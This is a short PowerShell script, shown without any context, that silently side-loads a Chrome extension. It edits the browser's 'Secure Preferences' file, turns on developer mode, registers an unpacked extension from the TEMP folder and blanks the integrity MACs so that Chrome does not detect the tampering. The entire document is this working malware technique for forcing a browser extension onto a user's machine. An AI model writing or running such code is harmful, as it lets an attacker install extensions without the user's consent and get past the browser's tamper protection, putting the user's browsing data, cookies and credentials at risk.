$id = "cfmepkojgnkahbmgablgdahdomjdppgf"
$zip = Join-Path $env:TEMP "$id.zip"
$dir = Join-Path $env:TEMP $id
Expand-Archive -Path $zip -DestinationPath $dir -Force
$prof = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default"
$sp = Join-Path $prof "Secure Preferences"
Copy-Item $sp "$sp.bak" -Force
$j = Get-Content $sp -Raw | ConvertFrom-Json
$j.extensions.ui | Add-Member -NotePropertyName developer_mode -NotePropertyValue $true -Force
$ext = @{ location = 4; path = $dir; from_webstore = $false; state = 1 }
$j.extensions.settings | Add-Member -NotePropertyName $id -NotePropertyValue $ext -Force
$j.protection.macs = @{}
$j.protection.super_mac = ""
$j | ConvertTo-Json -Depth 50 -Compress | Set-Content $sp
